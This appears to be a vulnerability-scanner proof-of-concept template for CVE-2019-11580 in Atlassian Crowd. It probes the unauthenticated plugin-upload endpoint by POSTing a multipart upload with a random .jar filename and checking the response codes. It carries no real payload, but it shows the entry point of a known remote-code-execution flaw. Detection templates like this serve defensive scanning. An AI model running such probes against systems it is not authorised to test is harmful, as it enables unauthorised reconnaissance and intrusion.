name: poc-yaml-atlassian-crowd-cve-2019-11580
set:
  r1: randomLowercase(8)
  r2: randomLowercase(4)
rules:
  - method: GET
    path: /crowd/admin/uploadplugin.action
    expression: |
      response.status == 400
  - method: POST
    path: /crowd/admin/uploadplugin.action
    headers:
      Content-Type: multipart/mixed; boundary=----------------------------f15fe87e95a7
    body: |-
      ------------------------------f15fe87e95a7
      Content-Disposition: form-data; name="file_cdl"; filename="{{r2}}.jar"
      Content-Type: application/octet-stream

      {{r1}}
      ------------------------------f15fe87e95a7--
    expression: |
      response.status == 500
detail:
  author: mumu0215(https://github.com/mumu0215)
  links:
    - https://github.com/jas502n/CVE-2019-11580